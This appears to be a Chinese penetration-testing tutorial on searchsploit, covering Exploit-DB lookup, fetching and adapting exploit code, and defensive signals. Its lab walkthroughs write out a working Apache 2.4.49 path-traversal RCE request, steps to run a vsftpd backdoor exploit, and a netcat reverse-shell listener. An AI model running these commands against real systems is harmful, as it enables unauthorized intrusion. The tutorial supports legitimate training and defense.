# searchsploit（Exploit-DB 本地检索）

> **一句话**：把 Exploit-DB 全量漏洞利用代码（PoC）同步到本地，然后**离线秒级检索**并把 PoC 取出来就能用。
> **分类**：漏洞利用 ｜ **Kali 包**：`exploitdb`（命令 `searchsploit`）｜ **官方文档**：<https://www.exploit-db.com/> ｜ 本地目录 `/usr/share/exploitdb/`

---

## 1. 它解决什么问题

识别出目标的服务/版本后，下一步是「有没有人已经写好利用代码」。Exploit-DB 是社区维护的公开 PoC 库，但网页检索慢、需要联网、结果难批处理。

`searchsploit` 解决的是**「把 EXP 用起来」的最后一公里**：

| 环节 | 直接搜网页 | searchsploit |
|------|------------|--------------|
| 检索 | 打开浏览器、翻页 | `searchsploit vsftpd 2.3.4` 本地瞬间出结果 |
| 批量查 | 一个个搜 | 脚本化 `-j` 出 JSON，喂给自动化流程 |
| 取用 | 手动点下载、复制粘贴 | `-m` 直接复制到当前目录 |
| 看代码 | 下载后再打开 | `-x` 直接在 pager 里读 |
| 找利用点 | 靠肉眼 | `-w` 拿到 Exploit-DB 网页，看讨论与补丁信息 |

与其它工具的边界（**本篇与 03 章漏洞分析篇的区别**：这里聚焦**怎么把 EXP 拿来跑通**，而不是怎么分析漏洞成因）：

- **vs `msfconsole`**：有 Metasploit 模块的漏洞优先用 `msfconsole`（参数化、能自动收会话）；**没有模块的**才走 searchsploit 手工利用。见 [`metasploit-framework.md`](metasploit-framework.md)。
- **vs `nmap --script vuln`**：nmap NSE 是**探测**，searchsploit 是**取用 EXP**。
- **vs `msfvenom`**：PoC 里需要 shellcode 时用 msfvenom 生成。见 [`msfvenom.md`](msfvenom.md)。

---

## 2. 工作原理

```
apt install exploitdb（每周随 Kali 仓库更新）
        │
        ├─► /usr/share/exploitdb/exploits/<平台>/<类型>/<EDB-ID>.<ext>   ← PoC 源码
        ├─► /usr/share/exploitdb/files_exploits.csv                     ← 索引（元数据）
        └─► /opt/exploitdb/searchsploit  ── 读 CSV ──► 你敲的关键词检索
```

- 索引 CSV 记录每条 PoC 的 `id / file / description / date / author / platform / type / port`。
- `-m`（mirror）会把 PoC 从 `/usr/share/exploitdb/` 复制到你当前目录，文件名通常是 `12345.py` 这样的 EDB-ID。
- **PoC 是「别人写的研究代码」**，常见问题：Python2 语法、硬编码靶机 IP、需要自己指定 `RHOST`、缺依赖库、甚至本身是恶意的（**务必先读代码**）。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install exploitdb
command -v searchsploit
```

```console
$ searchsploit --help | head -30
Usage: searchsploit [options] term1 [term2] ... [termN]
```

常用最短路径：

```bash
searchsploit vsftpd 2.3.4          # 关键词（多个词是 AND）
searchsploit -w "apache 2.4.49"    # 打开 Exploit-DB 网页
searchsploit -m 50383              # 把 EDB-ID 50383 复制到当前目录
searchsploit -x 50383              # 直接阅读
```

更新数据库：

```bash
sudo apt update && sudo apt install exploitdb    # 官方推荐（Kali 仓库滚动更新）
searchsploit -u                                  # 部分版本支持的自更新
```

---

## 4. 核心参数详解

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `term1 term2` | 关键词检索（**AND** 关系） | 词越少结果越全；`vsftpd 2.3.4` 比 `vsftpd 2.3.4 backdoor remote` 好 |
| `-c, --case` | 区分大小写 | 默认不区分，除非有冲突 |
| `-e, --exact` | 精确匹配版本号 | 避免 `2.3.4` 命中大量同类 |
| `-t, --title` | 只搜标题 | 结果少而准 |
| `-j, --json` | 输出 JSON | 与 `jq`/脚本配合，自动化首选 |
| `-o, --overflow` | 不截断列宽 | 描述很长时用 |
| `-w, --www` | 打印 Exploit-DB 在线链接 | 想看讨论、补丁、截图时用 |
| `-m, --mirror <ID>` | **把 PoC 复制到当前目录** | 取用 EXP 的主力命令 |
| `-x, --examine <ID>` | 用 pager 阅读 PoC | 复制前先读一遍 |
| `-p, --path <ID>` | 只打印 PoC 的本地路径 | 想 `cp` 到别处或喂给其它工具 |
| `-u, --update` | 从 git 更新数据库 | 视 Kali 打包方式，通常用 apt 更新 |
| `--exclude="term"` | 排除词 | 例如排除 `wordpress` 减少噪音 |
| `--nmap <xml>` | 读 nmap XML 自动查 EXP | 扫描完一键匹配，效率极高 |
| `--id` | 把结果显示为 EDB-ID | 与 `--nmap` 联用时更明确 |
| `--colour` / `--colour=never` | 彩色输出 | 重定向到文件时用 `never` |
| `-a`（部分版本）/ `--any` | OR 语义 | 关键词之间默认 AND，需要 OR 时用 |

---

## 5. 实战演练

> **环境声明**：以下仅在**授权测试**或**自建靶机**（本机 Metasploitable 2/3、VulnHub 虚拟机、HTB/THM 靶机）上执行。示例靶机 IP `192.168.56.102` 为本地虚拟网络。**禁止对未授权主机利用。**

### 场景 1：nmap 扫描 → 一键匹配 → 取 EXP（最标准流程）

```bash
sudo nmap -sV -sC -oX scan.xml 192.168.56.102
searchsploit --nmap scan.xml
```

```console
[*] SearchSploit - Exploit-DB Local Search

[*] Reading: scan.xml
[+] Found nmap results for: 192.168.56.102
  [*] 21/tcp   open  ftp     vsftpd 2.3.4
    [+] Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
        EDB-ID: 49757
        Path: /usr/share/exploitdb/exploits/linux/remote/49757.py
```

先读代码再看要不要用：

```bash
searchsploit -x 49757
```

```python
# 部分内容（示意）
import socket
host = "127.0.0.1"        # ← 硬编码，必须改
port = 6200
```

取出来改：

```bash
searchsploit -m 49757
mv 49757.py vsftpd_backdoor.py
sed -i 's/127.0.0.1/192.168.56.102/' vsftpd_backdoor.py
python3 vsftpd_backdoor.py
```

**解读**：`+` 开头的行是匹配到的 PoC；`EDB-ID` 是唯一编号，后面 `-m`/`-x` 都用它；`Path` 给出本地路径便于直接 `cp`。

### 场景 2：Web 应用漏洞的 EXP 适配（Apache 2.4.49 路径穿越 RCE）

```bash
searchsploit -t apache 2.4.49
```

```console
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
 Apache 2.4.49 - Path Traversal and Remote Code Execution (RCE) (Metasploit)       | linux/remote/50383.rb
 Apache 2.4.49 - Path Traversal and Remote Code Execution (RCE) (Python)          | multiple/webapps/50383.py
---------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m multiple/webapps/50383.py     # 也支持直接给 path
head -40 50383.py
python3 50383.py
```

```console
usage: 50383.py [-h] [-u URL] [-c COMMAND]
```

```bash
python3 50383.py -u http://192.168.56.102/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -c "id"
```

**解读**：很多 PoC 提供 argparse 参数（`-u`/`-c`），**不要**只会改硬编码路径——先 `-x` 或 `head` 看清接口。`(Metasploit)` 后缀说明有对应 msf 模块，那条路通常更省事。

### 场景 3：PoC 跑不通时的适配三件套（Python2 / 依赖 / 交互式）

```bash
# 1) 判断是不是 Python2 老脚本
searchsploit -x 11111 | head -5
```

```python
#!/usr/bin/python
print "Hello"          # ← Python2 的 print 语句，Python3 会 SyntaxError
```

```bash
# 方案 A：2to3 自动转换
2to3 -w 11111.py && python3 11111.py

# 方案 B：装 Python2（Kali 上已不默认提供，能用 2to3 就别装）
python2 11111.py

# 2) 缺依赖
python3 -m pip install requests --break-system-packages

# 3) 需要交互式 shell / 反向连接
nc -lvnp 4444
```

编译型 EXP（C）的通用流程：

```bash
searchsploit -m 46966            # 假设是 .c
gcc -o exp 46966.c -lpthread    # 按代码里的 #include 补 -l 库
./exp                            # 先不带参数跑，看 usage
./exp 192.168.56.102             # 按 usage 补参数
```

---

## 6. 输出解读

| 字段 | 含义 | 下一步 |
|------|------|--------|
| `Exploit Title` | PoC 标题，通常含「产品 - 类型 - 效果」 | 判断是否匹配你的版本 |
| `Path` | 相对 `/usr/share/exploitdb/exploits/` 的路径 | 给 `-x`/`-m`/`-p` 用 |
| `EDB-ID` | 唯一编号 | `-m <ID>` 直接取 |
| `(Metasploit)` | 有 msf 模块版本 | 优先 `msfconsole` |
| `(Python)` / `(C)` / `(Ruby)` / `(Go)` | PoC 语言 | 决定编译/解释方式 |
| `(PoC)` / `(verified)` | 验证状态（verified 更可信） | `verified` 可直接试，`PoC` 需自行调试 |
| 无结果 | 关键词太窄 | 放宽词、去掉版本号、或换 CVE 编号搜 |

**成功判据**：`-x` 读到的代码与你目标版本/端口/路径一致，且能跑出预期输出（`id`、反弹 shell、返回码差异）。

---

## 7. 与其他工具配合

```
nmap -sV -oX scan.xml ──► searchsploit --nmap scan.xml ──► 命中 EDB-ID
                                                            │
                    ┌───────────────────────────────────────┴──────────┐
                    │ 有 msf 模块 → msfconsole                            │ 无模块 → 手工
                    ▼                                                  ▼
        use exploit/... ; check ; run                    searchsploit -m ID →
                    │                                  2to3/编译 → 改参数 → 执行
                    │                                                  │
                    └────────► 取得低权限 shell ◄───────────────────────┘
                                     │
              msfvenom 生成新 payload ─┤─► 提权（linpeas / LES）
                                     ├─► 后渗透（impacket / mimikatz）
                                     └─► 内网（chisel / proxychains4 / ligolo-ng）
```

- 有模块的走 [`metasploit-framework.md`](metasploit-framework.md)，需要 shellcode 走 [`msfvenom.md`](msfvenom.md)。
- 漏洞成因分析（为什么这个 EXP 有效）见 `../../by-attack/` 与 `../../catalog/` 下的分类索引。
- 拿到 shell 之后的链条见 [`../08-后渗透/README.md`](../08-后渗透/README.md)。

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `SyntaxError: Missing parentheses in call to 'print'` | Python2 代码 | `2to3 -w x.py`，或装 `python2` |
| `ModuleNotFoundError: No module named 'requests'` | 依赖缺失 | `python3 -m pip install requests --break-system-packages` |
| 跑完没反应（卡住） | PoC 在等反弹连接 | **先起监听**：`nc -lvnp <port>` 再执行 |
| `Connection refused` | 端口/服务不匹配，或防火墙 | `nmap -p- ` 确认端口；确认靶机未打补丁 |
| 结果里全是 WordPress/不相关插件 | 关键词太宽 | `--exclude="wordpress"`、`-t` 只搜标题、加版本号 |
| `searchsploit: command not found` | 未安装/未建索引 | `sudo apt install exploitdb` |
| 结果为空但网上搜得到 | 本地库落后 | `sudo apt update && sudo apt install --reinstall exploitdb` |
| `-m` 覆盖已有文件 | 当前目录同名 | 先 `mv`，或换目录执行 |
| 复制出来的文件没有扩展名语义 | 文件名就是 EDB-ID | 按 `file 12345` 或内容判断类型，手动改名 |
| C EXP 编译报 `undefined reference` | 缺库 | 按 `#include` 补 `-l<lib>`；看代码头部注释 |
| 拿到的 PoC 运行后有可疑外连 | **PoC 可能被投毒** | 沙箱跑、先审计代码、比对 Exploit-DB 官网原文 |

---

## 9. 防御视角（蓝队）

| 信号 | 说明 | 缓解 |
|------|------|------|
| 已知 CVE 的利用流量 | Exploit-DB 里的 PoC 会让目标出现异常请求/报错栈 | 补丁管理优先、虚拟补丁（WAF/IPS） |
| 出口异常连接 | EXP 跑通后通常立即反弹 shell | 出站白名单、内网分段、DNS 日志审计 |
| Web 目录新增脚本 | Web 类 EXP 常上传 webshell | 上传目录禁止执行、文件完整性监控、最小权限运行 Web |
| 漏洞扫描器特征 UA/Payload | `--nmap` 前置扫描 + 组合利用的特征串 | WAF 规则、蜜罐、频率限制 |
| 版本信息泄露 | Banner 暴露精确版本，正是 searchsploit 的输入 | 隐藏版本号（`ServerTokens Prod` 等） |

对蓝队而言，**searchsploit 是自检利器**：用它枚举自身资产暴露的公开 EXP，比等攻击者先发现好。

---

## 10. 参考

- Exploit-DB 官网：<https://www.exploit-db.com/>
- searchsploit 手册：`man searchsploit`、`searchsploit --help`
- Kali 工具页（exploitdb）：<https://www.kali.org/tools/exploitdb/>
- 本地数据库目录：`ls /usr/share/exploitdb/`、`head /usr/share/exploitdb/files_exploits.csv`

## ⚠️ 法律与伦理

使用 Exploit-DB 中的 PoC 对**未授权**系统发起攻击，可能构成《刑法》第 285 条（非法侵入计算机信息系统、非法获取数据）、第 286 条（破坏计算机信息系统）等犯罪；即使 PoC 本身公开，使用行为的合法性取决于**授权**。本教程仅用于授权渗透测试、CTF 竞赛、自建靶场与防御验证。运行来路不明的 PoC 前请隔离环境并审计代码。
